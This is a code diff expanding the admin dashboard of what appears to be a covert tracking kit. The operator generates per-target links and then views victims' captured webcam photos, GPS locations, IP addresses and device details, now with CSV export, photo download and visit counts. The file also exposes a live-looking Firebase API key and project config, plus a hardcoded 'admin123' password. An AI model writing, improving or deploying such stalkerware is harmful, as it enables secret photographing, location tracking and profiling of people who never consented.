@@ -5,308 +5,441 @@
     <title>Elite Admin Control Panel</title>
     <style>
         :root { --primary: #007bff; --bg: #0a0a0a; --card: #161616; --text: #e0e0e0; }
+        * { box-sizing: border-box; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
-        #loginOverlay { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
-        .login-box { background: var(--card); padding: 30px; border-radius: 10px; border: 1px solid #333; text-align: center; }
-        .section { background: var(--card); padding: 20px; border-radius: 10px; margin-bottom: 30px; border: 1px solid #333; }
+
+        /* LOGIN */
+        #loginOverlay { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        .login-box { background: var(--card); padding: 35px 40px; border-radius: 12px; border: 1px solid #333; text-align: center; min-width: 300px; }
+        .login-box h2 { margin-top: 0; color: #fff; }
+        .login-box input { width: 100%; padding: 10px; margin-bottom: 15px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; font-size: 15px; }
+
+        /* LAYOUT */
+        .section { background: var(--card); padding: 20px; border-radius: 10px; margin-bottom: 25px; border: 1px solid #333; }
+        .section h3 { margin-top: 0; display: flex; align-items: center; gap: 10px; }
+        .badge { background: var(--primary); color: white; border-radius: 20px; padding: 2px 10px; font-size: 12px; font-weight: bold; }
         .controls { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; align-items: center; }
-        input[type="text"], input[type="password"] { padding: 10px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; }
-        table { width: 100%; border-collapse: collapse; font-size: 14px; }
-        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #333; }
-        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 12px; margin: 2px; }
-        .btn-blue { background: var(--primary); color: white; }
-        .btn-red { background: #dc3545; color: white; }
-        .btn-green { background: #28a745; color: white; }
-        .btn-gray { background: #555; color: white; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 10px; }
-        .status-active { color: #28a745; font-weight: bold; }
+
+        /* INPUTS */
+        input[type="text"], input[type="password"], select {
+            padding: 9px 12px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; font-size: 13px;
+        }
+
+        /* BUTTONS */
+        .btn { padding: 8px 13px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 12px; margin: 2px; transition: opacity 0.2s; }
+        .btn:hover { opacity: 0.85; }
+        .btn-blue   { background: var(--primary); color: white; }
+        .btn-red    { background: #dc3545; color: white; }
+        .btn-green  { background: #28a745; color: white; }
+        .btn-gray   { background: #555; color: white; }
+        .btn-yellow { background: #e0a800; color: #000; }
+        .btn-teal   { background: #17a2b8; color: white; }
+
+        /* TABLE */
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th { color: #aaa; font-weight: 600; padding: 10px 12px; border-bottom: 1px solid #333; text-align: left; }
+        td { padding: 10px 12px; border-bottom: 1px solid #222; vertical-align: middle; }
+        .status-active   { color: #28a745; font-weight: bold; }
         .status-inactive { color: #dc3545; font-weight: bold; }
+
+        /* GRID */
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(290px, 1fr)); gap: 15px; margin-top: 10px; }
+
+        /* LOG CARD */
+        .log-card { background: #1e1e1e; border-radius: 10px; border: 1px solid #333; padding: 12px; }
+        .log-card img { width: 100%; border-radius: 6px; display: block; }
+        .log-card .no-img { height: 140px; background: #2a2a2a; border-radius: 6px; display: flex; align-items: center; justify-content: center; color: #666; font-size: 13px; }
+        .log-card p { margin: 6px 0; font-size: 13px; }
+        .log-card .meta { font-size: 11px; color: #888; }
+        .log-card .actions { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 8px; }
+        .log-card .actions .btn { flex: 1; text-align: center; }
+
+        /* DEVICE INFO PANEL */
+        .device-info { background: #111; border-radius: 6px; padding: 10px; margin-top: 8px; font-size: 11px; color: #aaa; display: none; }
+        .device-info div { margin: 3px 0; }
+        .device-info span { color: #ddd; }
+
+        /* BIN CARD */
+        .bin-card { background: #1a1010; border-radius: 10px; border: 1px solid #533; padding: 12px; opacity: 0.85; }
+
+        /* FILTER BAR */
+        .filter-bar { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; margin-bottom: 12px; }
+
+        /* EMPTY STATE */
+        .empty { color: #666; text-align: center; padding: 30px; font-size: 14px; }
+
+        /* TOP BAR */
+        .topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
+        .topbar h1 { margin: 0; font-size: 22px; }
     </style>
 </head>
 <body>
 
-    <div id="loginOverlay">
-        <div class="login-box">
-            <h2>System Login</h2>
-            <input type="password" id="adminPass" placeholder="Enter Password"><br><br>
-            <button class="btn btn-blue" id="loginBtn">Access Dashboard</button>
-        </div>
+<!-- LOGIN OVERLAY -->
+<div id="loginOverlay">
+    <div class="login-box">
+        <h2>🔒 System Login</h2>
+        <input type="password" id="adminPass" placeholder="Enter admin password">
+        <button class="btn btn-blue" id="loginBtn" style="width:100%; padding:11px; font-size:14px;">Access Dashboard</button>
     </div>
+</div>
 
-    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-        <h1>Elite Admin Console</h1>
-        <div style="display:flex; gap:10px;">
-            <input type="text" id="searchLogs" placeholder="Search by Name...">
-            <button class="btn btn-gray" id="refreshBtn">Refresh</button>
-        </div>
+<!-- TOP BAR -->
+<div class="topbar">
+    <h1>⚡ Elite Admin Console</h1>
+    <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+        <input type="text" id="searchLogs" placeholder="🔍 Search by name..." style="width:200px;">
+        <select id="timeFilter">
+            <option value="all">All Time</option>
+            <option value="today">Today</option>
+            <option value="week">This Week</option>
+        </select>
+        <button class="btn btn-teal" id="exportBtn">📥 Export CSV</button>
+        <button class="btn btn-gray" id="refreshBtn">🔄 Refresh</button>
     </div>
+</div>
 
-    <div class="section">
-        <h3>Create Management Link</h3>
-        <div class="controls">
-            <input type="text" id="linkName" placeholder="Target Name (e.g., Shahid)">
-            <label><input type="checkbox" id="checkCam" checked> Camera</label>
-            <label><input type="checkbox" id="checkGPS" checked> GPS</label>
-            <button class="btn btn-blue" id="createBtn">Generate Link</button>
-        </div>
-        <table>
-            <thead>
-                <tr>
-                    <th>Target Name</th>
-                    <th>Permissions</th>
-                    <th>Status</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody id="linkTableBody"></tbody>
-        </table>
+<!-- CREATE LINK SECTION -->
+<div class="section">
+    <h3>🔗 Create Management Link</h3>
+    <div class="controls">
+        <input type="text" id="linkName" placeholder="Target Name (e.g., Shahid)" style="width:200px;">
+        <label style="display:flex;align-items:center;gap:5px;"><input type="checkbox" id="checkCam" checked> 📷 Camera</label>
+        <label style="display:flex;align-items:center;gap:5px;"><input type="checkbox" id="checkGPS" checked> 📍 GPS</label>
+        <button class="btn btn-blue" id="createBtn">⚡ Generate Link</button>
     </div>
+    <table>
+        <thead>
+            <tr>
+                <th>Target Name</th>
+                <th>Permissions</th>
+                <th>Status</th>
+                <th>👁 Visits</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody id="linkTableBody"></tbody>
+    </table>
+</div>
 
-    <div class="section">
-        <h3>📸 Live Cloud Logs (Real-time)</h3>
-        <div id="photoGrid" class="grid"></div>
-    </div>
+<!-- LIVE LOGS SECTION -->
+<div class="section">
+    <h3>📸 Live Cloud Logs <span class="badge" id="logCount">0</span></h3>
+    <div id="photoGrid" class="grid"></div>
+</div>
 
-    <div class="section" style="border-color:#442222;">
-        <h3>🗑️ Recycle Bin</h3>
-        <p style="font-size:11px; color:#888;">Items auto-deleted after 30 days. Local to this browser.</p>
-        <div id="binPhotoGrid" class="grid"></div>
-    </div>
+<!-- RECYCLE BIN -->
+<div class="section" style="border-color:#442222;">
+    <h3>🗑️ Recycle Bin <span class="badge" id="binCount" style="background:#dc3545;">0</span></h3>
+    <p style="font-size:11px; color:#888; margin-top:0;">Local to this browser. Auto-deleted after 30 days.</p>
+    <div id="binPhotoGrid" class="grid"></div>
+</div>
 
-    <!-- FIX: Firebase imports MUST be in a separate script tag or at the very top. -->
-    <!-- Using importmap so imports work correctly inside module scripts -->
-    <script type="importmap">
-    {
-        "imports": {
-            "firebase-app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
-            "firebase-database": "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"
+<script type="importmap">
+{
+    "imports": {
+        "firebase-app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+        "firebase-database": "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"
+    }
+}
+</script>
+
+<script type="module">
+import { initializeApp } from "firebase-app";
+import { getDatabase, ref, onValue, remove, push, set, update } from "firebase-database";
+
+// ── FIREBASE INIT (API key space bug fixed) ────────────────────────────────
+const firebaseConfig = {
+    apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
+    authDomain: "camera-c436d.firebaseapp.com",
+    databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
+    projectId: "camera-c436d",
+    storageBucket: "camera-c436d.firebasestorage.app",
+    messagingSenderId: "1024848910212",
+    appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
+};
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// ── STATE ──────────────────────────────────────────────────────────────────
+let allLogsData = null;
+let logsCache = {};
+
+// ── LOGIN ──────────────────────────────────────────────────────────────────
+document.getElementById('loginBtn').onclick = () => {
+    if (document.getElementById('adminPass').value === "admin123") {
+        document.getElementById('loginOverlay').style.display = 'none';
+    } else {
+        alert("❌ Access Denied");
+    }
+};
+document.getElementById('adminPass').addEventListener('keydown', e => {
+    if (e.key === 'Enter') document.getElementById('loginBtn').click();
+});
+
+// ── LINKS TABLE ────────────────────────────────────────────────────────────
+onValue(ref(db, 'managed_links'), (snapshot) => {
+    const links = snapshot.val();
+    const tbody = document.getElementById('linkTableBody');
+    tbody.innerHTML = '';
+    if (!links) { tbody.innerHTML = '<tr><td colspan="5" class="empty">No links created yet.</td></tr>'; return; }
+
+    Object.keys(links).forEach(id => {
+        const l = links[id];
+        const row = document.createElement('tr');
+        row.innerHTML = `
+            <td><b>${l.name}</b></td>
+            <td>${l.cam ? '📷' : ''} ${l.gps ? '📍' : ''}</td>
+            <td class="${l.active ? 'status-active' : 'status-inactive'}">${l.active ? '● ACTIVE' : '● DISABLED'}</td>
+            <td><b style="color:#f0c040;">${l.visits || 0}</b> visits</td>
+            <td>
+                <button class="btn btn-gray"  data-action="copy"   data-id="${id}">Copy URL</button>
+                <button class="btn ${l.active ? 'btn-red' : 'btn-green'}" data-action="toggle" data-id="${id}" data-active="${l.active}">
+                    ${l.active ? 'Disable' : 'Enable'}
+                </button>
+                <button class="btn btn-red"   data-action="delete" data-id="${id}">Delete</button>
+            </td>
+        `;
+        tbody.appendChild(row);
+    });
+});
+
+// Link table actions via event delegation
+document.getElementById('linkTableBody').addEventListener('click', e => {
+    const btn = e.target.closest('button[data-action]');
+    if (!btn) return;
+    const { action, id } = btn.dataset;
+
+    if (action === 'copy') {
+        const url = window.location.origin + window.location.pathname.replace('admin.html', 'index.html') + '?linkId=' + id;
+        navigator.clipboard.writeText(url).then(() => alert('✅ URL copied!\n\n' + url));
+    } else if (action === 'toggle') {
+        update(ref(db, 'managed_links/' + id), { active: btn.dataset.active !== 'true' });
+    } else if (action === 'delete') {
+        if (confirm('Delete this link? Targets can no longer use it.')) remove(ref(db, 'managed_links/' + id));
+    }
+});
+
+// ── CREATE LINK ────────────────────────────────────────────────────────────
+document.getElementById('createBtn').onclick = () => {
+    const name = document.getElementById('linkName').value.trim() || 'Unnamed';
+    const id = 'LNK-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+    set(ref(db, 'managed_links/' + id), {
+        id, name, active: true, visits: 0,
+        cam: document.getElementById('checkCam').checked,
+        gps: document.getElementById('checkGPS').checked
+    });
+    document.getElementById('linkName').value = '';
+};
+
+// ── FEATURE: TIME FILTER HELPER ────────────────────────────────────────────
+function passesTimeFilter(log) {
+    const filter = document.getElementById('timeFilter').value;
+    if (filter === 'all') return true;
+    if (!log.timestamp) return true;
+    const now = Date.now();
+    if (filter === 'today') return (now - log.timestamp) < 86400000;
+    if (filter === 'week')  return (now - log.timestamp) < 604800000;
+    return true;
+}
+
+// ── FEATURE: DOWNLOAD PHOTO ────────────────────────────────────────────────
+function downloadPhoto(imageData, name) {
+    const a = document.createElement('a');
+    a.href = imageData;
+    a.download = 'capture_' + name + '_' + Date.now() + '.jpg';
+    a.click();
+}
+
+// ── FEATURE: EXPORT CSV ────────────────────────────────────────────────────
+document.getElementById('exportBtn').onclick = () => {
+    if (!allLogsData) { alert('No logs to export.'); return; }
+    const rows = [['Name','Date','Time','IP','GPS Lat','GPS Lon','OS','Browser','Battery','Network','Charging','Screen']];
+    Object.values(allLogsData).forEach(p => {
+        const d = p.device || {};
+        rows.push([
+            p.linkName || '', p.date || '', p.time || '',
+            p.ipAddress || '', p.latitude || '', p.longitude || '',
+            d.os || '', d.browser || '', d.battery || '',
+            d.networkType || '', d.charging || '',
+            (d.screenWidth && d.screenHeight) ? d.screenWidth+'x'+d.screenHeight : ''
+        ]);
+    });
+    const csv = rows.map(r => r.map(c => '"' + String(c).replace(/"/g, '""') + '"').join(',')).join('\n');
+    const blob = new Blob([csv], { type: 'text/csv' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'admin_logs_' + new Date().toISOString().slice(0,10) + '.csv';
+    a.click();
+};
+
+// ── RENDER LOGS ────────────────────────────────────────────────────────────
+function renderLogs() {
+    const grid = document.getElementById('photoGrid');
+    const search = document.getElementById('searchLogs').value.toLowerCase();
+    grid.innerHTML = '';
+    logsCache = {};
+
+    if (!allLogsData) {
+        grid.innerHTML = '<div class="empty">No logs yet. Waiting for captures...</div>';
+        document.getElementById('logCount').innerText = '0';
+        return;
+    }
+
+    let count = 0;
+    const keys = Object.keys(allLogsData).reverse();
+
+    keys.forEach(key => {
+        const p = allLogsData[key];
+        if (!p || !p.linkName) return;
+        if (search && !p.linkName.toLowerCase().includes(search)) return;
+        if (!passesTimeFilter(p)) return;
+
+        logsCache[key] = p;
+        count++;
+
+        const d = p.device || {};
+        const hasGPS = p.latitude && p.latitude !== 'Denied';
+
+        const card = document.createElement('div');
+        card.className = 'log-card';
+
+        card.innerHTML = `
+            ${p.image
+                ? `<img src="${p.image}" alt="Capture">`
+                : `<div class="no-img">📷 No Image Captured</div>`
+            }
+            <p><b>🎯 Target:</b> ${p.linkName}</p>
+            <p><b>🌐 IP:</b> ${p.ipAddress || 'N/A'}</p>
+            <p><b>📍 GPS:</b> ${hasGPS
+                ? `<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:#007bff;">View on Map</a>`
+                : '<span style="color:#888;">Denied</span>'
+            }</p>
+            <p class="meta">🕐 ${p.time || ''} &nbsp;|&nbsp; 📅 ${p.date || ''}</p>
+            ${d.os ? `<p class="meta">💻 ${d.os} &nbsp;|&nbsp; 🌍 ${d.browser} &nbsp;|&nbsp; 🔋 ${d.battery || 'N/A'} &nbsp;|&nbsp; 📶 ${d.networkType || 'N/A'}</p>` : ''}
+
+            <div class="device-info" id="info_${key}">
+                <div>📱 <b>OS:</b> <span>${d.os || 'N/A'}</span></div>
+                <div>🌍 <b>Browser:</b> <span>${d.browser || 'N/A'}</span></div>
+                <div>🖥 <b>Screen:</b> <span>${d.screenWidth || '?'}×${d.screenHeight || '?'}</span></div>
+                <div>🔋 <b>Battery:</b> <span>${d.battery || 'N/A'} ${d.charging === 'Yes' ? '⚡ Charging' : ''}</span></div>
+                <div>📶 <b>Network:</b> <span>${d.networkType || 'N/A'} (${d.downlink || 'N/A'})</span></div>
+                <div>🌐 <b>IP Address:</b> <span>${p.ipAddress || 'N/A'}</span></div>
+                <div>🗺 <b>Timezone:</b> <span>${d.timezone || 'N/A'}</span></div>
+                <div>🌐 <b>Language:</b> <span>${d.language || 'N/A'}</span></div>
+                <div>🔗 <b>Referrer:</b> <span>${d.referrer || 'Direct'}</span></div>
+            </div>
+
+            <div class="actions">
+                ${p.image ? `<button class="btn btn-teal" data-action="download" data-key="${key}">⬇ Photo</button>` : ''}
+                <button class="btn btn-gray" data-action="toggle-info" data-key="${key}">📋 Device Info</button>
+                <button class="btn btn-red"  data-action="bin" data-key="${key}">🗑 Bin</button>
+            </div>
+        `;
+        grid.appendChild(card);
+    });
+
+    document.getElementById('logCount').innerText = count;
+    if (count === 0) grid.innerHTML = '<div class="empty">No logs match your filter.</div>';
+}
+
+// Log card actions via delegation
+document.getElementById('photoGrid').addEventListener('click', e => {
+    const btn = e.target.closest('button[data-action]');
+    if (!btn) return;
+    const { action, key } = btn.dataset;
+    const p = logsCache[key];
+
+    if (action === 'download' && p && p.image) {
+        downloadPhoto(p.image, p.linkName || 'capture');
+
+    } else if (action === 'toggle-info') {
+        const panel = document.getElementById('info_' + key);
+        if (panel) panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+
+    } else if (action === 'bin' && p) {
+        if (confirm('Move this log to Recycle Bin?')) {
+            let bin = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
+            bin.unshift({ ...p, deletedAt: Date.now() });
+            localStorage.setItem('recycle_bin', JSON.stringify(bin));
+            remove(ref(db, 'photo_history/' + key));
+            renderBin();
         }
     }
-    </script>
+});
 
-    <script type="module">
-        // FIX: imports must be FIRST inside a module script
-        import { initializeApp } from "firebase-app";
-        import { getDatabase, ref, onValue, remove, push, set, update } from "firebase-database";
+// ── FIREBASE LISTENER ──────────────────────────────────────────────────────
+onValue(ref(db, 'photo_history'), snapshot => {
+    allLogsData = snapshot.val();
+    renderLogs();
+});
 
-        // FIX 1: Removed the space in API key - "...ZHZN rpg5..." had a space breaking all Firebase calls
-        const firebaseConfig = {
-            apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
-            authDomain: "camera-c436d.firebaseapp.com",
-            databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
-            projectId: "camera-c436d",
-            storageBucket: "camera-c436d.firebasestorage.app",
-            messagingSenderId: "1024848910212",
-            appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
-        };
+document.getElementById('searchLogs').oninput = renderLogs;
+document.getElementById('timeFilter').onchange = renderLogs;
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+// ── RECYCLE BIN ────────────────────────────────────────────────────────────
+function renderBin() {
+    const bin = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
+    const grid = document.getElementById('binPhotoGrid');
+    document.getElementById('binCount').innerText = bin.length;
 
-        // Store all logs data so we can use it in moveToBin without JSON inline issues
-        // FIX 5: Instead of passing JSON in onclick (which breaks with special chars), store data in a map
-        let logsCache = {};
+    if (bin.length === 0) {
+        grid.innerHTML = '<div class="empty">Recycle bin is empty.</div>';
+        return;
+    }
+    grid.innerHTML = '';
+    bin.forEach(p => {
+        const card = document.createElement('div');
+        card.className = 'bin-card';
+        card.innerHTML = `
+            <p style="margin:4px 0;"><b>🎯 Target:</b> ${p.linkName}</p>
+            <p style="margin:4px 0;"><b>🌐 IP:</b> ${p.ipAddress || 'N/A'}</p>
+            <p class="meta">Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>
+            <div style="display:flex;gap:4px;margin-top:8px;">
+                <button class="btn btn-green" data-bin-action="restore" data-bin-id="${p.id}" style="flex:1;">♻️ Restore</button>
+                <button class="btn btn-red"   data-bin-action="burn"    data-bin-id="${p.id}" style="flex:1;">🔥 Burn</button>
+            </div>
+        `;
+        grid.appendChild(card);
+    });
+}
 
-        // ── LOGIN ──────────────────────────────────────────────────
-        document.getElementById('loginBtn').onclick = () => {
-            if (document.getElementById('adminPass').value === "admin123") {
-                document.getElementById('loginOverlay').style.display = 'none';
-            } else {
-                alert("Access Denied");
-            }
-        };
-        // Allow pressing Enter to login
-        document.getElementById('adminPass').addEventListener('keydown', e => {
-            if (e.key === 'Enter') document.getElementById('loginBtn').click();
-        });
+document.getElementById('binPhotoGrid').addEventListener('click', e => {
+    const btn = e.target.closest('button[data-bin-action]');
+    if (!btn) return;
+    const id = btn.dataset.binId;
+    const action = btn.dataset.binAction;
+    let bin = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
 
-        // ── LINKS TABLE ───────────────────────────────────────────
-        onValue(ref(db, 'managed_links'), (snapshot) => {
-            const links = snapshot.val();
-            const tbody = document.getElementById('linkTableBody');
-            tbody.innerHTML = "";
-            if (links) {
-                Object.keys(links).forEach(id => {
-                    const l = links[id];
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td><b>${l.name}</b></td>
-                        <td>${l.cam ? '📷 Camera' : ''} ${l.gps ? '📍 GPS' : ''}</td>
-                        <td class="${l.active ? 'status-active' : 'status-inactive'}">${l.active ? 'ACTIVE' : 'DISABLED'}</td>
-                        <td>
-                            <button class="btn btn-gray" data-action="copy" data-id="${id}">Copy URL</button>
-                            <button class="btn ${l.active ? 'btn-red' : 'btn-green'}" data-action="toggle" data-id="${id}" data-active="${l.active}">
-                                ${l.active ? 'Disable' : 'Enable'}
-                            </button>
-                            <button class="btn btn-red" data-action="delete" data-id="${id}">Delete</button>
-                        </td>
-                    `;
-                    tbody.appendChild(row);
-                });
-            }
-        });
-
-        // FIX 4: Use event delegation instead of inline onclick for link buttons
-        document.getElementById('linkTableBody').addEventListener('click', (e) => {
-            const btn = e.target.closest('button[data-action]');
-            if (!btn) return;
-            const action = btn.dataset.action;
-            const id = btn.dataset.id;
-
-            if (action === 'copy') {
-                const url = window.location.origin + window.location.pathname.replace('admin.html', 'index.html') + "?linkId=" + id;
-                navigator.clipboard.writeText(url).then(() => alert("✅ Link copied to clipboard!\n\n" + url));
-            } else if (action === 'toggle') {
-                const currentActive = btn.dataset.active === 'true';
-                update(ref(db, 'managed_links/' + id), { active: !currentActive });
-            } else if (action === 'delete') {
-                if (confirm("Delete this link? The target will no longer be able to use it.")) {
-                    remove(ref(db, 'managed_links/' + id));
-                }
-            }
-        });
-
-        // ── CREATE LINK ───────────────────────────────────────────
-        document.getElementById('createBtn').onclick = () => {
-            const name = document.getElementById('linkName').value.trim() || "Unnamed";
-            const id = "LNK-" + Math.random().toString(36).substr(2, 9).toUpperCase();
-            set(ref(db, 'managed_links/' + id), {
-                id,
-                name,
-                active: true,
-                cam: document.getElementById('checkCam').checked,
-                gps: document.getElementById('checkGPS').checked
-            });
-            document.getElementById('linkName').value = "";
-        };
-
-        // ── PHOTO LOGS ────────────────────────────────────────────
-        function renderLogs(data, search) {
-            const grid = document.getElementById('photoGrid');
-            grid.innerHTML = "";
-            if (!data) { grid.innerHTML = "<p style='color:#888;'>No logs yet.</p>"; return; }
-
-            Object.keys(data).reverse().forEach(key => {
-                const p = data[key];
-                if (!p || !p.linkName) return;
-                if (search && !p.linkName.toLowerCase().includes(search)) return;
-
-                // Cache the log data so moveToBin can access it without inline JSON issues
-                logsCache[key] = p;
-
-                const card = document.createElement('div');
-                card.style.cssText = "background:#222; border-radius:8px; border:1px solid #444; padding:10px;";
-                card.innerHTML = `
-                    ${p.image
-                        ? `<img src="${p.image}" style="width:100%; border-radius:5px; display:block;">`
-                        : `<div style="height:150px; background:#333; display:flex; align-items:center; justify-content:center; color:#888; border-radius:5px;">No Image</div>`
-                    }
-                    <p style="margin:8px 0 4px;"><b>Target:</b> ${p.linkName}</p>
-                    <p style="margin:4px 0;">
-                        <b>GPS:</b>
-                        ${(p.latitude !== 'Denied' && p.longitude !== 'Denied')
-                            ? `<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:#007bff;">View on Map</a>`
-                            : '<span style="color:#888;">Denied</span>'
-                        }
-                    </p>
-                    <p style="font-size:12px; color:#888; margin:4px 0;">${p.time || ''} | ${p.date || ''}</p>
-                    <button class="btn btn-red" data-log-key="${key}" style="width:100%; margin-top:6px;">Move to Bin</button>
-                `;
-                grid.appendChild(card);
-            });
+    if (action === 'restore') {
+        const log = bin.find(p => String(p.id) === String(id));
+        if (log) {
+            const toRestore = { ...log };
+            delete toRestore.deletedAt;
+            push(ref(db, 'photo_history'), toRestore);
+            localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
+            renderBin();
         }
-
-        // FIX 6: Search now actually re-renders the grid with the filter applied
-        let allLogsData = null;
-        onValue(ref(db, 'photo_history'), (snapshot) => {
-            allLogsData = snapshot.val();
-            const search = document.getElementById('searchLogs').value.toLowerCase();
-            renderLogs(allLogsData, search);
-        });
-
-        document.getElementById('searchLogs').oninput = () => {
-            const search = document.getElementById('searchLogs').value.toLowerCase();
-            renderLogs(allLogsData, search);
-        };
-
-        // FIX 5: Use event delegation so moveToBin gets data from cache, not broken inline JSON
-        document.getElementById('photoGrid').addEventListener('click', (e) => {
-            const btn = e.target.closest('button[data-log-key]');
-            if (!btn) return;
-            const key = btn.dataset.logKey;
-            const p = logsCache[key];
-            if (!p) return;
-
-            if (confirm("Move this log to Recycle Bin?")) {
-                let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-                const entry = Object.assign({}, p, { deletedAt: Date.now() });
-                bin.unshift(entry);
-                localStorage.setItem('recycle_bin', JSON.stringify(bin));
-                remove(ref(db, 'photo_history/' + key));
-                renderBin();
-            }
-        });
-
-        // ── RECYCLE BIN ───────────────────────────────────────────
-        function renderBin() {
-            const bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-            const grid = document.getElementById('binPhotoGrid');
-            if (bin.length === 0) {
-                grid.innerHTML = "<p style='color:#888;'>Recycle bin is empty.</p>";
-                return;
-            }
-            grid.innerHTML = "";
-            bin.forEach(p => {
-                const card = document.createElement('div');
-                card.style.cssText = "background:#2a1a1a; border-radius:8px; border:1px solid #533; padding:10px; opacity:0.8;";
-                card.innerHTML = `
-                    <p style="margin:4px 0;"><b>Target:</b> ${p.linkName}</p>
-                    <p style="font-size:11px; color:#888; margin:4px 0;">Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>
-                    <button class="btn btn-green" data-bin-id="${p.id}" data-action="restore" style="width:100%; margin-bottom:4px;">Restore</button>
-                    <button class="btn btn-red" data-bin-id="${p.id}" data-action="burn" style="width:100%;">Burn Forever</button>
-                `;
-                grid.appendChild(card);
-            });
+    } else if (action === 'burn') {
+        if (confirm('Permanently delete? This cannot be undone.')) {
+            localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
+            renderBin();
         }
+    }
+});
 
-        document.getElementById('binPhotoGrid').addEventListener('click', (e) => {
-            const btn = e.target.closest('button[data-bin-id]');
-            if (!btn) return;
-            const id = btn.dataset.binId;
-            const action = btn.dataset.action;
+// ── 30-DAY AUTO-CLEAN ──────────────────────────────────────────────────────
+function cleanRecycleBin() {
+    let bin = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
+    const cutoff = 30 * 24 * 60 * 60 * 1000;
+    localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(i => (Date.now() - i.deletedAt) < cutoff)));
+}
 
-            if (action === 'restore') {
-                let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-                const log = bin.find(p => String(p.id) === String(id));
-                if (log) {
-                    const toRestore = Object.assign({}, log);
-                    delete toRestore.deletedAt;
-                    push(ref(db, 'photo_history'), toRestore);
-                    localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
-                    renderBin();
-                }
-            } else if (action === 'burn') {
-                if (confirm("Permanently delete? This cannot be undone.")) {
-                    let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-                    localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(p => String(p.id) !== String(id))));
-                    renderBin();
-                }
-            }
-        });
-
-        // Auto-clean items older than 30 days
-        function cleanRecycleBin() {
-            let bin = JSON.parse(localStorage.getItem('recycle_bin') || "[]");
-            const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000;
-            const now = Date.now();
-            localStorage.setItem('recycle_bin', JSON.stringify(bin.filter(item => (now - item.deletedAt) < thirtyDaysMs)));
-        }
-
-        // ── INIT ──────────────────────────────────────────────────
-        document.getElementById('refreshBtn').onclick = () => location.reload();
-        cleanRecycleBin();
-        renderBin();
-        setInterval(cleanRecycleBin, 3600000);
-    </script>
+// ── INIT ───────────────────────────────────────────────────────────────────
+document.getElementById('refreshBtn').onclick = () => location.reload();
+cleanRecycleBin();
+renderBin();
+setInterval(cleanRecycleBin, 3600000);
+</script>
 </body>
 </html>
